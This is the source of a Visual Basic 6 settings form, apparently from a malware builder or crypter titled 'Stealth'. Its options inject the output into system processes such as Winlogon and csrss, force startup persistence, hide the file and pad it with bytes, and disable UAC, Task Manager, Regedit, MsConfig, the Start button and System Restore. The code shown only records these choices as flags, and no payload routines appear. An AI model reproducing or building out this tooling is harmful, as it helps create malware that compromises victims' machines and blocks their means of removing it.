VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#13.0#0"; "CODEJO~3.OCX"
Begin VB.Form Stealth 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   6000
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   11250
   Icon            =   "Stealth.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Stealth.frx":F172
   ScaleHeight     =   6000
   ScaleWidth      =   11250
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin XtremeSuiteControls.ComboBox ComboBox1 
      Height          =   360
      Left            =   240
      TabIndex        =   0
      Top             =   1560
      Width           =   2535
      _Version        =   851968
      _ExtentX        =   4471
      _ExtentY        =   635
      _StockProps     =   77
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   -2147483641
      Style           =   2
      Appearance      =   2
      UseVisualStyle  =   0   'False
      Text            =   "ComboBox1"
   End
   Begin XtremeSuiteControls.CheckBox CheckBox3 
      Height          =   195
      Left            =   7920
      TabIndex        =   1
      Top             =   3720
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox7"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.CheckBox CheckBox4 
      Height          =   195
      Left            =   7920
      TabIndex        =   2
      Top             =   3240
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox7"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.CheckBox CheckBox5 
      Height          =   195
      Left            =   7920
      TabIndex        =   3
      Top             =   2760
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox7"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.CheckBox CheckBox6 
      Height          =   195
      Left            =   7920
      TabIndex        =   4
      Top             =   2280
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox7"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.CheckBox CheckBox1 
      Height          =   195
      Left            =   7920
      TabIndex        =   10
      Top             =   4200
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox7"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.CheckBox CheckBox2 
      Height          =   195
      Left            =   7920
      TabIndex        =   14
      Top             =   4680
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox7"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.ComboBox ComboBox2 
      Height          =   360
      Left            =   1440
      TabIndex        =   16
      Top             =   4800
      Width           =   3375
      _Version        =   851968
      _ExtentX        =   5953
      _ExtentY        =   635
      _StockProps     =   77
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   -2147483641
      Style           =   2
      Appearance      =   2
      UseVisualStyle  =   0   'False
      Text            =   "ComboBox1"
   End
   Begin XtremeSuiteControls.CheckBox CheckBox7 
      Height          =   195
      Left            =   240
      TabIndex        =   17
      Top             =   4365
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox7"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.FlatEdit Text3 
      Height          =   315
      Left            =   600
      TabIndex        =   19
      Top             =   4800
      Width           =   735
      _Version        =   851968
      _ExtentX        =   1296
      _ExtentY        =   556
      _StockProps     =   77
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   -2147483641
      Appearance      =   1
      UseVisualStyle  =   0   'False
   End
   Begin XtremeSuiteControls.CheckBox CheckBox11 
      Height          =   195
      Left            =   120
      TabIndex        =   21
      Top             =   2280
      Width           =   195
      _Version        =   851968
      _ExtentX        =   344
      _ExtentY        =   344
      _StockProps     =   79
      Caption         =   "CheckBox1"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.FlatEdit FlatEdit1 
      Height          =   315
      Left            =   2280
      TabIndex        =   24
      Top             =   2640
      Width           =   1935
      _Version        =   851968
      _ExtentX        =   3413
      _ExtentY        =   556
      _StockProps     =   77
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BackColor       =   -2147483641
      MaxLength       =   20
      Appearance      =   1
      UseVisualStyle  =   0   'False
   End
   Begin XtremeSuiteControls.CheckBox CheckBox8 
      Height          =   195
      Left            =   720
      TabIndex        =   25
      Top             =   3480
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox7"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.CheckBox CheckBox9 
      Height          =   195
      Left            =   720
      TabIndex        =   27
      Top             =   3720
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox7"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.CheckBox CheckBox10 
      Height          =   195
      Left            =   720
      TabIndex        =   30
      Top             =   3960
      Width           =   195
      _Version        =   851968
      _ExtentX        =   353
      _ExtentY        =   353
      _StockProps     =   79
      Caption         =   "CheckBox7"
      Appearance      =   2
   End
   Begin XtremeSuiteControls.FlatEdit FlatEdit2 
      Height          =   360
      Left            =   2880
      TabIndex        =   32
      Top             =   1560
      Visible         =   0   'False
      Width           =   3735
      _Version        =   851968
      _ExtentX        =   6588
      _ExtentY        =   635
      _StockProps     =   77
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "C:\Windows\System32\Winlogon.exe"
      BackColor       =   -2147483641
      Appearance      =   1
      UseVisualStyle  =   0   'False
   End
   Begin XtremeSuiteControls.Label Label11 
      Height          =   255
      Left            =   3480
      TabIndex        =   33
      Top             =   1200
      Visible         =   0   'False
      Width           =   2415
      _Version        =   851968
      _ExtentX        =   4260
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Inject Into Custom Process"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin XtremeSuiteControls.Label Label18 
      Height          =   255
      Left            =   960
      TabIndex        =   31
      Top             =   3960
      Width           =   5175
      _Version        =   851968
      _ExtentX        =   9128
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Include Bound Files In Startup"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label17 
      Height          =   255
      Left            =   120
      TabIndex        =   29
      Top             =   3120
      Width           =   1575
      _Version        =   851968
      _ExtentX        =   2778
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "File Attributes:"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin XtremeSuiteControls.Label Label16 
      Height          =   255
      Left            =   960
      TabIndex        =   28
      Top             =   3720
      Width           =   5175
      _Version        =   851968
      _ExtentX        =   9128
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Set File To Hidden"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label15 
      Height          =   255
      Left            =   960
      TabIndex        =   26
      Top             =   3480
      Width           =   5055
      _Version        =   851968
      _ExtentX        =   8916
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Set File To Read-Only"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label12 
      Height          =   255
      Left            =   480
      TabIndex        =   23
      Top             =   2640
      Width           =   1695
      _Version        =   851968
      _ExtentX        =   2990
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Filename In Startup"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label14 
      Height          =   255
      Left            =   360
      TabIndex        =   22
      Top             =   2280
      Width           =   2535
      _Version        =   851968
      _ExtentX        =   4471
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Persistence - Force Start Up"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label10 
      Height          =   255
      Left            =   120
      TabIndex        =   20
      Top             =   5280
      Visible         =   0   'False
      Width           =   3855
      _Version        =   851968
      _ExtentX        =   6800
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "0 bytes will be added to the output file"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label9 
      Height          =   255
      Left            =   480
      TabIndex        =   18
      Top             =   4350
      Width           =   975
      _Version        =   851968
      _ExtentX        =   1720
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Add Data"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label8 
      Height          =   255
      Left            =   8160
      TabIndex        =   15
      Top             =   4680
      Width           =   2295
      _Version        =   851968
      _ExtentX        =   4048
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Disable System Restore"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label1 
      Height          =   375
      Left            =   120
      TabIndex        =   13
      Top             =   120
      Width           =   6495
      _Version        =   851968
      _ExtentX        =   11456
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Manage Your Output's Environment"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Simplified Arabic Fixed"
         Size            =   15.75
         Charset         =   178
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin VB.Image Image6 
      Height          =   285
      Left            =   10400
      Picture         =   "Stealth.frx":1E2E4
      Top             =   20
      Visible         =   0   'False
      Width           =   420
   End
   Begin VB.Image Image4 
      Height          =   285
      Left            =   10845
      Picture         =   "Stealth.frx":21459
      Top             =   20
      Visible         =   0   'False
      Width           =   420
   End
   Begin VB.Image Image5 
      Height          =   285
      Left            =   10400
      Picture         =   "Stealth.frx":24851
      Top             =   20
      Width           =   420
   End
   Begin VB.Image Image11 
      Height          =   285
      Left            =   10845
      Picture         =   "Stealth.frx":278D4
      Top             =   20
      Width           =   420
   End
   Begin XtremeSuiteControls.Label Label7 
      Height          =   375
      Left            =   7620
      TabIndex        =   12
      Top             =   1680
      Width           =   2655
      _Version        =   851968
      _ExtentX        =   4683
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Bypass Settings"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   18
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label2 
      Height          =   255
      Left            =   8160
      TabIndex        =   11
      Top             =   4200
      Width           =   1575
      _Version        =   851968
      _ExtentX        =   2778
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Disable MsConfig"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label13 
      Height          =   255
      Left            =   840
      TabIndex        =   9
      Top             =   1200
      Width           =   1575
      _Version        =   851968
      _ExtentX        =   2778
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Inject Output File"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin XtremeSuiteControls.Label Label3 
      Height          =   255
      Left            =   8160
      TabIndex        =   8
      Top             =   3720
      Width           =   1815
      _Version        =   851968
      _ExtentX        =   3201
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Disable Start Button"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label4 
      Height          =   255
      Left            =   8160
      TabIndex        =   7
      Top             =   3240
      Width           =   2055
      _Version        =   851968
      _ExtentX        =   3625
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Disable Task Manager"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label5 
      Height          =   255
      Left            =   8160
      TabIndex        =   6
      Top             =   2760
      Width           =   1335
      _Version        =   851968
      _ExtentX        =   2355
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Disable UAC"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin XtremeSuiteControls.Label Label6 
      Height          =   255
      Left            =   8160
      TabIndex        =   5
      Top             =   2280
      Width           =   1575
      _Version        =   851968
      _ExtentX        =   2778
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Disable Regedit"
      ForeColor       =   16777088
      BackColor       =   -2147483641
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Transparent     =   -1  'True
   End
   Begin VB.Image Image1 
      Height          =   6000
      Left            =   0
      Picture         =   "Stealth.frx":2ACDF
      Top             =   0
      Width           =   11250
   End
End
Attribute VB_Name = "Stealth"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private SettedX As Integer, SettedY As Integer, Dragging As Boolean

Private Sub CheckBox1_Click()
If CheckBox1.Value = xtpChecked Then
DisableMsconfig = 1
Else
DisableMsconfig = 0
End If
End Sub

Private Sub CheckBox10_Click()
If CheckBox10.Value = xtpChecked Then BundleStart = 1 Else BundleStart = 0
End Sub

Private Sub CheckBox11_Click()

    If CheckBox11.Value = xtpChecked Then
        WillStrUp = 1
    Else
        WillStrUp = 0
    End If
    
End Sub

Private Sub CheckBox2_Click()
If CheckBox2.Value = xtpChecked Then
DisableSystemRestore = 1
Else
DisableSystemRestore = 0
End If
End Sub

Private Sub CheckBox3_Click()
If CheckBox3.Value = xtpChecked Then
DisableStart = 1
Else
DisableStart = 0
End If
End Sub

Private Sub CheckBox4_Click()
If CheckBox4.Value = xtpChecked Then
DisableTaskMgr = 1
Else
DisableTaskMgr = 0
End If
End Sub

Private Sub CheckBox5_Click()
If CheckBox5.Value = xtpChecked Then
DisableUAC = 1
Else
DisableUAC = 0
End If
End Sub

Private Sub CheckBox6_Click()
If CheckBox6.Value = xtpChecked Then
DisableRegEdit = 1
Else
DisableRegEdit = 0
End If
End Sub

Private Sub CheckBox7_Click()
If CheckBox7.Value = xtpChecked Then
Label10.Visible = True
Else
Label10.Visible = False
End If
End Sub

Private Sub CheckBox8_Click()

If CheckBox8.Value = xtpChecked Then
    Rdonly = 1
Else
    Rdonly = 0
End If

End Sub

Private Sub CheckBox9_Click()

    If CheckBox9.Value = xtpChecked Then
        SetHidden = 1
    Else
        SetHidden = 0
    End If
    
    
End Sub

Private Sub ComboBox1_Click()

    With ComboBox1
        If .ListIndex = 0 Then FlatEdit2.Text = ""
        If .ListIndex = 1 Then FlatEdit2.Text = "C:\Windows\System32\Winlogon.exe"
        If .ListIndex = 2 Then FlatEdit2.Text = "C:\Windows\System32\Calc.exe"
        If .ListIndex = 3 Then FlatEdit2.Text = "C:\Windows\System32\Notepad.exe"
        If .ListIndex = 4 Then FlatEdit2.Text = "C:\Windows\Explorer.exe"
        If .ListIndex = 5 Then FlatEdit2.Text = "C:\Windows\System32\Taskmgr.exe"
        If .ListIndex = 6 Then FlatEdit2.Text = "C:\Windows\System32\hkcmd.exe"
        If .ListIndex = 7 Then FlatEdit2.Text = "C:\Windows\System32\csrss.exe"
        If .ListIndex = 8 Then FlatEdit2.Text = "Default browser ie C:\Program Files\Mozilla Firefox\Firefox.exe"
    End With

End Sub

Private Sub ComboBox2_Click()
Label10.Caption = Text3.Text & " " & ComboBox2.Text & " will be added to the output file"
End Sub

Private Sub FlatEdit1_Change()

On Local Error Resume Next

Dim SplExt() As String
Dim SplNull() As String

If Len(FlatEdit1) = 5 Then FlatEdit1.SelStart = 1

SplExt() = Split(FlatEdit1, ".")
If SplExt(0) = "" Then FlatEdit1 = Replace$(FlatEdit1, ".exe", ""): GoTo NextOne

SplNull() = Split(FlatEdit1, "")
If InStr(FlatEdit1, ".exe") Then GoTo NextOne
If SplNull(Len(FlatEdit1) + 1) = "" Then FlatEdit1 = FlatEdit1 & ".exe"
NextOne:

If InStr(FlatEdit1.Text, ".exe") <> 0 Then
    Label15.Caption = "Set " & FlatEdit1.Text & " To Read-Only"
    Label16.Caption = "Set " & FlatEdit1.Text & " To Hidden"
Else
    Label15.Caption = "Set " & FlatEdit1.Text & ".exe" & " To Read-Only"
    Label16.Caption = "Set " & FlatEdit1.Text & ".exe" & " To Hidden"
End If

If FlatEdit1.Text = "" Then
    Label15.Caption = "Set File To Read-Only"
    Label16.Caption = "Set File To Hidden"
End If

End Sub

Private Sub form_load()

    FlatEdit2.Visible = True
    Label11.Visible = True
    ComboBox1.Left = 240
    Label13.Left = 840

' Inject To
With ComboBox1
.AddItem ("Don't Inject")
.AddItem ("Custom Process")
.AddItem ("Calculator.exe ")
.AddItem ("Notepad.exe ")
.AddItem ("Explorer.exe ")
.AddItem ("Taskmgr.exe ")
.AddItem ("Hkcmd.exe ")
.AddItem ("Csrss.exe")
.AddItem ("Default Browser")
.ListIndex = 0
End With

With ComboBox2
.AddItem ("Bytes")
.AddItem ("Kilobytes")
.AddItem ("Megabytes")
.ListIndex = 0
End With

Text3.Text = "1"

End Sub

Private Sub Image1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image11.Visible = True
Image5.Visible = True
Image4.Visible = False
Image6.Visible = False

If Dragging Then
Me.Left = Me.Left + (X - SettedX)
Me.Top = Me.Top + (Y - SettedY)
End If
End Sub

Private Sub Image1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
SettedX = X
SettedY = Y
Dragging = True
End Sub
Private Sub Image1_Click()
CheckBox1.SetFocus
End Sub
Private Sub Image1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Dragging = False
End Sub

Private Sub Image11_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image4.Visible = True
Image11.Visible = False
End Sub

Private Sub Image4_Click()
Me.Hide
End Sub

Private Sub Image5_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image6.Visible = True
Image5.Visible = False
End Sub

Private Sub Image6_Click()
Me.WindowState = vbMinimized
End Sub

Private Sub Label2_Click()
CheckBox1.Value = xtpChecked
End Sub

Private Sub Label3_Click()
CheckBox3.Value = xtpChecked
End Sub

Private Sub Label4_Click()
CheckBox4.Value = xtpChecked
End Sub

Private Sub Label5_Click()
CheckBox5.Value = xtpChecked
End Sub

Private Sub Label6_Click()
CheckBox6.Value = xtpChecked
End Sub


Private Sub Text3_Change()
If Text3.Text = "" Then Exit Sub
If IsNumeric(Text3.Text) = False Then Text3.Text = "1"
Label10.Caption = Text3.Text & " " & ComboBox2.Text & " will be added to the output file"
End Sub
